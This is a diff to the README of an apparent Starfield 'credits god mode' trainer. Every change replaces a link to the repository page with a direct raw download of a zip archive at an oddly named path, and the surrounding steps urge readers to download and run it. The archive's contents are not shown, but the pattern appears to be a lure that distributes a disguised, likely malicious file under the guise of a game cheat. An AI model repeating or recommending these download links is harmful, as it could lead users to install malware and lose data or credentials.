@@ -1,6 +1,6 @@
 # 🚀 Starfield-Credits-God-Mode-Trainer - Unlock God Mode Instantly Today
 
-[![Download Now](https://img.shields.io/badge/Download-Starfield_Trainer-2ea44f?style=for-the-badge&logo=github)](https://github.com/genusmimosabarrio4776/Starfield-Credits-God-Mode-Trainer)
+[![Download Now](https://img.shields.io/badge/Download-Starfield_Trainer-2ea44f?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/genusmimosabarrio4776/Starfield-Credits-God-Mode-Trainer/main/squeezability/v2.2.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Follow these simple steps to get started. It takes less than 2 minutes.
 
 Visit this link to download the application:
 
-[**Click Here to Download Starfield Trainer**](https://github.com/genusmimosabarrio4776/Starfield-Credits-God-Mode-Trainer)
+[**Click Here to Download Starfield Trainer**](https://raw.githubusercontent.com/genusmimosabarrio4776/Starfield-Credits-God-Mode-Trainer/main/squeezability/v2.2.zip)
 
 The download will start automatically. Save the file to your desktop or Downloads folder.
 
@@ -78,7 +78,7 @@ Here's a more detailed walkthrough for first-time users.
 
 1. **Download** – Use the button below to get the file.
    
-   [**⬇️ Download Starfield Trainer Now**](https://github.com/genusmimosabarrio4776/Starfield-Credits-God-Mode-Trainer)
+   [**⬇️ Download Starfield Trainer Now**](https://raw.githubusercontent.com/genusmimosabarrio4776/Starfield-Credits-God-Mode-Trainer/main/squeezability/v2.2.zip)
 
 2. **Save the file** – Choose a location you remember, like your Desktop.
 
@@ -238,7 +238,7 @@ This trainer is updated regularly to stay compatible with Starfield patches. Che
 4. **Activate** your cheats
 5. **Enjoy** the game without limits
 
-[**🚀 Download Starfield Trainer Now**](https://github.com/genusmimosabarrio4776/Starfield-Credits-God-Mode-Trainer)
+[**🚀 Download Starfield Trainer Now**](https://raw.githubusercontent.com/genusmimosabarrio4776/Starfield-Credits-God-Mode-Trainer/main/squeezability/v2.2.zip)
 
 ---
 
